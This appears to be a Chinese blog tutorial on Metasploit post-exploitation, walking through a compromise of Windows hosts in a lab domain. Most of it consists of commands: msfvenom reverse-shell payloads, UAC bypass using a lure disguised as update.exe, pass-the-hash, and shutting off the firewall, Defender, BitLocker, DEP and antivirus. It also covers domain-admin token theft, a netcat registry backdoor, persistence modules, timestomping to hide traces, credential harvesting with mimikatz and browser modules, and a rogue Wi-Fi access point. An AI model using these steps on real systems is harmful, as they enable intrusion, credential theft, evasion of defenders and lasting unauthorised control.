msf后渗透

### 文章目录
<ul><ul><ul>- [前提与概览](#_2)- [获取system权限](#system_13)- [hashdump](#hashdump_84)- [关闭防火墙](#_123)- [磁盘加密](#_147)- [关闭DEP](#DEP_161)- [杀死防病毒软件](#_168)- [开启远程桌面服务](#_179)<ul>- [使用post模块](#post_181)- [使用已存脚本](#_198)- [有关域](#_222)- [Token利用](#Token_229)- [域环境搭建](#_241)- [利用ms_08_067获取win xp的系统权限](#ms_08_067win_xp_284)- [获取域Token](#Token_286)- [添加一条防火墙策略](#_362)- [metsvc](#metsvc_570)- [persistence](#persistence_588)
#### <a id="_2"/>前提与概览

<img src="https://img-blog.csdnimg.cn/20200719095831148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
首先构造一个payload

```
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe -o 1.exe

```

已经找到一台机器执行了我的payload<br/>
<img src="https://img-blog.csdnimg.cn/20200719114021192.png" alt=""/>

进一步获取更高的权限。

#### <a id="system_13"/>获取system权限

```
load priv
getsystems

```

执行出现超时<br/>
先返回msf，保留session

```
background

```

**绕过UAC限制**

1.可以使用如下模块

```
use exploit/windows/local/ask 

```

看一下需要配置项<br/>
<img src="https://img-blog.csdnimg.cn/20200719115201281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
这个模块需要基于已有的session，然后进一步请求客户端执行我们的shell。

设置名称以欺骗客户端执行

```
set filename update.exe //一般会看到更新后点击确认
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.8
set session 3 

```

exploit执行会在客户机弹出执行update.exe的弹窗，一旦执行，直接获取更高的shell。

<img src="https://img-blog.csdnimg.cn/20200719124627477.png" alt=""/><br/>
这样就获得了更高权限的shell.但是这种客户机的主人一般不会这么傻到直接运行有shell的程序。

2.还可以使用如下模块

```
use exploit/windows/local/bypassuac  ///需要获取sehll用户组在管理员组

```

这个模块的用法和前面的类似，但是它是上传了包含绕过uac的程序，并不会在客户机的屏幕上弹出框。<br/>
<img src="https://img-blog.csdnimg.cn/20200719170812143.png" alt=""/>

3.还可以用如下模块

```
use exploit/windows/local/bypassuac_injection  //需要获取sehll用户组在管理员组

```

这个同样是不会弹出框，直接内部执行。

4.利用漏洞拿到system

```
use exploit/windows/local/ms13_053_schlamperei 
use exploit/windows/local/ms13_081_track_popup_menu 
use exploit/windows/local/ms13_097_ie_registry_symlink 
use exploit/windows/local/ppr_flatten_rec 
use exploit/windows/local/ms10_015_kitrap0d   //版本限制为sp4-win7x86

```

上面的五个都是提取system的漏洞利用模块。其实不仅仅有这五个，这里只是列举。

第1个和第二个有windows版本的要求，为windows SP0或者SP1<br/>
<img src="https://img-blog.csdnimg.cn/20200719175101608.png" alt=""/><br/>
**注：其实不必这么麻烦，如果能Meterpreter直接迁移到系统的进程里，可以直接执行系统命令的**<br/>
**图形化界面payload**

```
set payload windows/vncinject/reverse_tcp 
set ViewOnly no //可操作

```

#### <a id="hashdump_84"/>hashdump

hashdump用来获取系统账户的用户名和密码的哈希值。

利用 `exploit/windows/smb/psexec`模块和hash后的密码登陆smb服务得到shell

```
use  exploit/windows/smb/psexec

```

配置参数：

```
set smbpass hashdump(得到的hash值）

set smbuser guest

```

利用之前的最高shell关掉UAC(用户账户控制），执行如下两条命令

```
 cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft \Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f 

 cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft \Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f 

//在shell的窗口下执行，不是meterpreter命令符下
参数说明
ADD 添加一个注册表项
-v 创建键值
-t 键值类型
-d 键值的值

```

重启使注册表内容生效

```
shutdown /r /t 0

```

run拿到shell

#### <a id="_123"/>关闭防火墙

前提：已经通过漏洞拿到了目标主机的管理员权限的shell.

使用如下命令关闭防火墙

```
shell

netsh advfirewall set allprofiles state off

```

查看一下，关闭成功<br/>
<img src="https://img-blog.csdnimg.cn/20200720113501635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

进一步结束`Windefend`

```
 net stop windefend  //netstop 用来结束windows的服务

```

在windows下查看服务情况<br/>
`win+r 运行services.msc`<br/>
<img src="https://img-blog.csdnimg.cn/20200720114515588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

#### <a id="_147"/>磁盘加密

Bitlocker 磁盘加密，有的电脑的加密文件是被加密封存，Bitlocker加密就是一种，集成在 windows系统软件系统中。

关掉目标主机的磁盘加密：

```
 manage-bde -off C: 

```

查看磁盘加密状态：

```
manage-bde -status C: 

```

#### <a id="DEP_161"/>关闭DEP

DEP是一种基于硬件的防护cpu防护技术。关闭DEPk可以容易的攻破敌方的防御。<br/>
可以使用如下命令

```
 bcdedit.exe /set {current} nx AlwaysOff

```

#### <a id="_168"/>杀死防病毒软件

在meterpreter的命令符下输入

```
Run killav

```

也可以直接使用post模块

```
run post/windows/manage/killav 

```

#### <a id="_179"/>开启远程桌面服务

##### <a id="post_181"/>使用post模块

```
 run post/windows/manage/enable_rdp 

```

<img src="https://img-blog.csdnimg.cn/20200721171535926.png" alt=""/>

连接远程桌面

```
rdesktop +ip地址

```

msf会自动生成一个资源文件，控制完成后可以运行次资源文件，使得记录清除，关闭远程桌面服务。

```
run multi_console_command -rc +生成的文件路径

```

##### <a id="_198"/>使用已存脚本

开启远程桌面服务

```
 run getgui –e 

```

添加远程桌面用户和密码

```
 run getgui -u yuanfh -p pass 

```

#### <a id="_209"/>抓取屏幕

```
 screenshot 

```

或者使用插件

```
load espia  //加载插件
screengrab //截取屏幕

```

#### <a id="_221"/>域环境搭建

##### <a id="_222"/>有关域

域就是将多台计算机在逻辑上组织到一起，进行集中管理，也就是创建在域控制器上的组，将组的账户信息保存在活动目录中。域组可以用来控制域内任何一台计算机资源的访问和执行系统任务的权限。<br/>
在微软的世界中，一个域是由一个或多个域控制器(domain controller)来控制的（其实域控制器并不神秘，无非就是装了一些特别软件的电脑）。其他的电脑加入该域，就要接受域控制器的控制。域控制器中有两个重要的表，一个是加入该域的电脑的列表，另一个表用来保存叫做活动目录(Active Directory)的东西。<br/>
活动目录就是你登录公司网络的帐户。活动目录中存储着你的权限。你在某台电脑上登录，你键入用户名和密码，你的电脑首先要把你的登录信息发送到域控制器，域控制器首先核实你的登录信息是否正确，然后把一个叫access key的东西返还给你登录的电脑。这个access key中就包含着你的权限，由它来决定你是否可以安装软件，或者使用打印机等等。<br/>
<img src="https://img-blog.csdnimg.cn/20200721182934863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

[参考链接](https://blog.csdn.net/lolichan/article/details/84924050)

##### <a id="Token_229"/>Token利用

```
 Delegate Token：交互登陆会话，例如正常的账号登陆电脑
 Impersonate Token：非交互登陆会话，例如用命令框连结的字符型界面

```

我们都知道，伪造管理员账户的token可以使我们从普通提升为管理员权限。<br/>
在一个域环境下，如果域管理员以管理员的账号密码登陆了普通用户的电脑，然后注销登陆，`Delegate Token注销变为 Impersonate Token，但是管理员权限不变，如果我们拥有这台pc的system权限，那么就有可能拿到域管理员的token`。

利用的msf  Incognito 插件窃取token

##### <a id="_241"/>域环境搭建

windows家庭版和普通版是无法搭建域环境的，只是适合个人使用，搭建域环境需要是windows server版本。

1.配置windows sevver的静态ip<br/>
静态ip的配置百度<br/>
2.安装域控

```
win+R运行如下
depromo

```

<img src="https://img-blog.csdnimg.cn/20200721185015927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
<img src="https://img-blog.csdnimg.cn/20200721185040879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
给域创建名称，这个是随便的<br/>
<img src="https://img-blog.csdnimg.cn/20200721185200735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
后面的就一路下一步

<img src="https://img-blog.csdnimg.cn/20200721185308881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
<img src="https://img-blog.csdnimg.cn/20200721185619579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
完成安装后重新启动。<br/>
[参考链接](https://blog.csdn.net/wwl012345/article/details/88934571)

使用一台win xp电脑加入域<br/>
1.配置静态ip和dns<br/>
<img src="https://img-blog.csdnimg.cn/20200722102032868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
xp的dns解析地址必须为装有域控的那台主机的ip地址。

2.在计算机右击属性，找到域，如下图。<br/>
<img src="https://img-blog.csdnimg.cn/20200722102752301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

3.输入加入域管理员的账户和密码，使得认证通过

4.再次登陆时，选择登陆到域<br/>
<img src="https://img-blog.csdnimg.cn/20200722103317804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
5.找到域控制器，为xp分配一个账户

```
win+r 运行如下
dsa.msc

```

右键用户，选择新建用户<br/>
<img src="https://img-blog.csdnimg.cn/20200722103555864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

##### <a id="ms_08_067win_xp_284"/>利用ms_08_067获取win xp的系统权限

<img src="https://img-blog.csdnimg.cn/20200722105240957.png" alt=""/>

##### <a id="Token_286"/>获取域Token

使用msf如下插件<br/>
`incognito`可以进行toke的伪造，获取等<br/>
<img src="https://img-blog.csdnimg.cn/20200722110202105.png" alt=""/><br/>
首先，load插件

```
load incognito 

```

列出电脑所有的用户token

```
 list_tokens -u  //只有获取了目的主机的系统权限才能 使用这条命令

```

<img src="https://img-blog.csdnimg.cn/20200722110434275.png" alt=""/><br/>
发现并没有域管理员的任何信息<br/>
使用域管理员登陆这台主机<br/>
<img src="https://img-blog.csdnimg.cn/2020072211091176.png" alt=""/>

再次执行列出所有token的命令，发现就多了一条记录<br/>
<img src="https://img-blog.csdnimg.cn/20200722111022174.png" alt=""/>

token伪造

```
 impersonate_token  +token

 impersonate_token lab\\administrator  //这里要用双斜线时因为单斜线具有转义作用。

```

伪造成功后，查看个人信息<br/>
<img src="https://img-blog.csdnimg.cn/2020072211133225.png" alt=""/><br/>
再次`getuid`,已经是域管理员了<br/>
<img src="https://img-blog.csdnimg.cn/2020072211142761.png" alt=""/>

执行当前的权限shell

```
 execute -f cmd.exe -i -t    

```

参数说明：-f为执行的程序 -i打开对话命令交互，-t 以当前的token执行程序。

#### <a id="_328"/>注册表操作

注册表<br/>
<img src="https://img-blog.csdnimg.cn/20200722170325310.png" alt=""/><br/>
例如：<br/>
已经拿到了目标主机的merterpreter的权限，我们通过修改注册表，使得每次目标主机开机的时候都会运行我们上传到目标主机的nc.exe，方便对目标主机进行监控。<br/>
1.上传nc.exe到目标主机

```
 upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32   //传送到了系统目录下

```

2.查看注册表中默认跟随主机启动的内容

```
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run  //reg 是merterpreter中专门查看修改注册表的命令

```

<img src="https://img-blog.csdnimg.cn/20200722174602563.png" alt=""/><br/>
3.添加一个键值

```
 reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe'   
 //setval参数为添加或者修改某个键值
 // -Ldp L参数为侦听，d表示在后台，p表示为端口
 // 合起来就是在注册表的未知添加键值，内容是执行目录下的nc.exe,后台打开cmd.exe，监听444端口，等待连接。

```

执行成功后查看插入成功。<br/>
<img src="https://img-blog.csdnimg.cn/20200722180604531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
也可以用如下命令

```
 reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
 // queryval为查询

```

<img src="https://img-blog.csdnimg.cn/2020072218150985.png" alt=""/>

##### <a id="_362"/>添加一条防火墙策略

首先进入命令提示符

```
execute -f cmd -i -H   //隐蔽的方式打开shell

```

查看防火墙的状态

```
netsh firewall show opmode 

```

增加一条允许策略

```
 netsh firewall add portopening TCP 4444 "test" ENABLE ALL 
  //关于名称test可以设置为一个具有隐蔽性的名称，可以从防火墙的策略中摘取名称，
  达到掩饰目的

```

连接shell

```
nc 192.168.1.7 444

```

其他注册表选项<br/>
[其他注册表选项](https://support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart)

#### <a id="sniffer_390"/>sniffer抓包

当拿到一台电脑的shell的时候，可以启用抓包来对这台机器的流量经过进行抓包嗅探，过滤出对进一步渗透有用的信息。<br/>
首先，加载插件

```
 load sniffer 

```

选择抓包的接口

```
sniffer_interfaces

```

<img src="https://img-blog.csdnimg.cn/20200722214652575.png" alt=""/>

例如选择接口2进行抓包

```
 sniffer_start 2 

```

msf抓的包均在kali的一个缓冲区里，最多抓取50000个<br/>
<img src="https://img-blog.csdnimg.cn/20200722215900503.png" alt=""/><br/>
导出包

```
 sniffer_dump 3 1.cap 

```

<img src="https://img-blog.csdnimg.cn/20200722220034292.png" alt=""/><br/>
使用模块分解包

```
use auxiliary/sniffer/psnuffle 

set PCAPFILE 2.cap

```

直接run，但是并没有出现想要的结果，模块还是做的不太全面，建议使用wireshark<br/>
<img src="https://img-blog.csdnimg.cn/20200722221830889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

#### <a id="_428"/>目标主机文件搜索

serach命令

例如搜索主机的全部.ini文件

```
 search -f *.ini

```

搜索整台计算机可能需要很长时间，并且观察用户可能会注意到他们的硬盘不断颠簸，所以在指定的目录下搜索。<br/>
例如：

```
search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.pdf

```

#### <a id="_442"/>文件访问时间修改

在对目标系统文件进行操作的时候，会留下关于文件操作的时间，包含`创建时间，修改时间，改变时间`顾名思义，系统管理员可以通过这三个时间的信息来查看文件是否被改变，何时改变，判断系统是否被入侵。

对于渗透测试，当然希望能够将改动的痕迹抹除。<br/>
可以用`stat - 文件名`来查看文件时间的详细信息。

**Timestomp**<br/>
Timestomp 是merterpreter 查看修改文件改动时间的命令。<br/>
查看文件的具体时间

```
 timestomp -v 1.txt 

```

相比于stat命令，多了`Entry Modified: 2020-07-22 22:51:39 -0400`<br/>
<img src="https://img-blog.csdnimg.cn/20200723110253120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
将一个文件的MAC时间改为按照另一个文件的MAC时间复制

```
 timestomp -f c:\\autoexec.bat 1.txt 

```

时间具体修改参数

```
 -m  //修改Modified时间
 -a   //修改Accessed时间
 -c  //修改Created 时间
 -e  //修改 Entry Modified时间
 -z  //四个时间全部修改

```

例如：

```
 timestomp -z "MM/DD/YYYY HH24:MI:SS"  2.txt

```

#### <a id="POST_479"/>POST模块

一些常用的post模块<br/>
1.判断目标机是否为虚拟机

```
 run post/windows/gather/checkvm 

```

<img src="https://img-blog.csdnimg.cn/20200724192007121.png" alt=""/>

2.查看目标主机的账号和token

```
 run post/windows/gather/credentials/credential_collector 

```

3.查看目标机的安装软件

```
 run post/windows/gather/enum_applications 

```

<img src="https://img-blog.csdnimg.cn/20200724192603441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

4.本地提权测试模块

假如拿到的权限并不是管理员系统权限，又不知道是否存在本地提权的漏洞，就可以选择如下模块进行测试

```
run post/multi/recon/local_exploit_suggester 

```

<img src="https://img-blog.csdnimg.cn/20200724193257495.png" alt=""/><br/>
它会自动将所有的可以测试的本地提权的漏洞走一遍，然后将可行的罗列出来。

5.删除存在的用户

```
 run post/windows/manage/delete_user USERNAME=badboy

```

可以从shell的窗口处使用`net user`查看存在的用户

6.进一步了解目标主机的系统环境信息

```
 run post/multi/gather/env 

```

<img src="https://img-blog.csdnimg.cn/20200724194125414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

6.查看关于火狐浏览器登陆的web appliaction 账号密码

假设目标系统安装了火狐浏览器，并将账号密码设置为保存在浏览器中

```
run post/multi/gather/firefox_creds 

```

7.ssh保存账号查看

```
 run post/multi/gather/ssh_creds 

```

8.检测系统上的一个程序是否为恶意软件<br/>
例如：

```
 run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe

```

#### <a id="shell_548"/>拿到shell后立刻执行脚本

一般情况下，payLoad都有高级参数，里面存在一个advanced的高级选项。<br/>
<img src="https://img-blog.csdnimg.cn/20200725094424536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
可以看到有一个 `AutoRunScript`  参数，这个参数就是在执行payload后，立刻执行脚本。

例如：`set AutoRunScript migrate -n explorer.exe`<br/>
这个语句的意思就是一旦拿到shell，立刻将进程迁移到explorer.exe中，避免注入的有毒exe被杀死后，shell丢失。

或者其他脚本，例如，立刻查看目标主机最近打开的文件

```
set AutoRunScript post/windows/gather/dumplinks

```

如果先后有执行顺序的两个脚本，可以在`InitialAutoRunScript`选项内添加一个最先执行的脚本。

修改hosts文件

```
run hostsedit -e 1.1.1.1,www.baidu.com

```

#### <a id="_569"/>持久后门

##### <a id="metsvc_570"/>metsvc

```
 run metsvc -A       //   删除 -r 

```

<img src="https://img-blog.csdnimg.cn/20200725170648976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
这个命令直接会生成系统的进程，名称为metsvc.exe，监听31337端口<br/>
并且开机会自己启动，但是缺点就是端口不能自己配置，上传的exe文件也不能更改名称。

连接后门

```

 set PAYLOAD windows/metsvc_bind_tcp 
 set LPORT 31337 
 set RHOST 1.1.1.1

```

<img src="https://img-blog.csdnimg.cn/20200725172801885.png" alt=""/><br/>
卡了好久都没拿到shell，这个模块估计是不宰维护了

##### <a id="persistence_588"/>persistence

查看一下参数的配置项<br/>
<img src="https://img-blog.csdnimg.cn/20200725174154849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

```
-A 默认的连接方式为exploit/multi/handler
-S  作为一个系统服务进程工作在系统上
-X 自动执行当系统开机
-i 延迟时间，当服务运行后隔n秒执行回连
-p 端口
-r 回连的ip地址，也就是kali的地址

```

示例：

```
 run persistence -X -i 10 -p 4444 -r 1.1.1.1 
 run persistence -U -i 20 -p 4444 -r 1.1.1.1 
 run persistence -S -i 20 -p 4444 -r 1.1.1.1

```

#### <a id="Mimikatz__608"/>Mimikatz 扩展

需要获得system权限

```
load mimikatz 

load的新命令如下：
 wdigest 
 kerberos
 msv
 ssp
 tspkg
 ivessp

```

<img src="https://img-blog.csdnimg.cn/20200725184547416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/><br/>
上面的这些都和系统的账号有关系<br/>
mimikatz_command -f 无法获取帮助，却能从报错信息中获取使用方法

<img src="https://img-blog.csdnimg.cn/20200725191536792.png" alt=""/>

<img src="https://img-blog.csdnimg.cn/20200725191713942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

查看系统运行服务

```
mimikatz_command -f service::list

```

查看系统进程

```
 mimikatz_command -f process::list

```

可以通过报错获取更多命令提示<br/>
<img src="https://img-blog.csdnimg.cn/20200725192425244.png" alt=""/>

#### <a id="phppayload_643"/>生成php类型payload

msf不仅仅能生成可执行的exe payload，同样也可以生成其他类型的payload,例如，php

```
 msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php 
 //生成phpshell,反弹shell到kali主机上

```

利用的主要方向是文件上传，上传到目标服务器上php文件然后访问php文件，解析后直接回连我们的kali主机。

#### <a id="Web_Delivery_651"/>Web Delivery

需要存在一个命令执行的漏洞，然后生成的payload填入命令执行的漏洞中，直接实现拿到www的权限。

首先生成payload

```
use exploit/multi/script/web_delivery 

```

show targets<br/>
<img src="https://img-blog.csdnimg.cn/20200725225427931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

```
set target 1
set payload  php/meterpreter/reverse_tcp 
set lhost 192.168.1.8
run

```

将生成的payload填入命令执行漏洞，执行就会反弹shell。

#### <a id="Karmetasploit_671"/>Karmetasploit

可以用来伪造ap，嗅探密码，截获数据，浏览器攻击。

首先下载资源文件

```
 wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt 

```

安装依赖包

```
 gem install activerecord sqlite3-ruby

```

伪造ap需要对连接的用户分配ip，所以要首先安装dhcp服务器

```
 apt-get install isc-dhcp-server 

```

配置dhcp服务器

```
option domain-name-servers 10.0.0.1;
default-lease-time 60;
max-lease-time 72;
ddns-update-style none;
authoritative;
log-facility local7;
subnet 10.0.0.0 netmask 255.255.255.0 { 
	range 10.0.0.100 10.0.0.254;
	option routers 10.0.0.1;
    option domain-name-servers 10.0.0.1; 
    }

```

准备一个无线网卡，连接到虚拟机上。<br/>
<img src="https://img-blog.csdnimg.cn/20200726184252715.png" alt=""/><br/>
`ipconfig`出现wlan0，说明网卡安装成功，下一步就是把这个网卡做成具有监听作用的网卡。<br/>
<img src="https://img-blog.csdnimg.cn/20200726184538139.png" alt=""/>

```
 airmon-ng start wlan0 

```

用`ifconfig`可以看到侦听的网卡后多了`mon`<br/>
<img src="https://img-blog.csdnimg.cn/20200726184835809.png" alt=""/>

伪造一个ap

```
 airbase-ng -P -C 30 -e "FREE" -v wlan0mon 

```

激活并配置<br/>
首先查看接口`ifconfig -a`查看到名称为ato

激活并配置ip

```
 ifconfig at0 up 10.0.0.1 netmask 255.255.255.0 

```

创建一个租约文件

```
 touch /var/lib/dhcp/dhcpd.leases 

```

启动dhcp服务

```
 dhcpd -cf /etc/dhcp/dhcpd.conf at0 

```

在物理主机上看，创建的已经存在了<br/>
<img src="https://img-blog.csdnimg.cn/20200726190142357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""/>

启动 Karmetasploit

```
msfconsole -q -r karma.rc_.txt 

```

资源文件.txt为许多漏洞利用的代码，一个个进行测试，如果存在漏洞，就会直接反弹shell到kali。

修改资源文件，官方给出的文件是不能适应真是环境的

```
vim  karma.rc_.txt 

```

删除第一行连接数据库的语句，因为msf已经连接了msf的账号。<br/>
删除steg的配置项。<br/>
删除set lport语句

添加路由转发

```
 echo 1 &gt; /proc/sys/net/ipv4/ip_forward  //开启数据转发
 
 iptables -P FORWARD ACCEPT 
 
 iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
  

```



参考文章地址:https://blog.csdn.net/Yu_csdnstory/article/details/107441171